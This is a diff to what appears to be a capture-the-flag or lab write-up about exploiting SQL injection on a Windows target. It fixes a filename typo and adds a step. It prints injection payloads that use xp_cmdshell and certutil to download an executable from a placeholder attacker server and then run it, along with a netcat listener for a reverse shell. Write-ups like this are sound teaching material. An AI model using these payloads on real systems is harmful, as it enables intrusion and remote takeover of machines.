@@ -88,7 +88,7 @@ nc -lnvp 3333
 Using the SQLi vector, I can run the **xp_cmdshell** utility to download and execute this file:
 
 ```
-'; EXEC xp_cmdshell 'certutil -urlcache -f http://MY_SERVER_IP_ADDR:8000/rshel.exe C:\Windows\Temp\rshel.exe'; --
+'; EXEC xp_cmdshell 'certutil -urlcache -f http://MY_SERVER_IP_ADDR:8000/rshell.exe C:\Windows\Temp\rshell.exe'; --
 ```
 
 I checked my Python server's output:
@@ -96,12 +96,15 @@ I checked my Python server's output:
 ```shell
 python3 -m http.server 8000
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-MACHINE_IP - - [01/Jan/2024 10:15:01] "GET /rshel.exe HTTP/1.1" 200 -
+MACHINE_IP - - [01/Jan/2024 10:15:01] "GET /rshell.exe HTTP/1.1" 200 -
 ```
 
 Suggesting that the target machine fetched my file.    
+I will run the executable file on the target machine. 
+```
+'; EXEC xp_cmdshell 'C:\Windows\Temp\rshell.exe'; --
+```
 Now, if everything goes well, my Netcat listener should have a reverse shell connection:
-
 ```
 nc -lnvp 3333
 listening on [any] 3333 ...
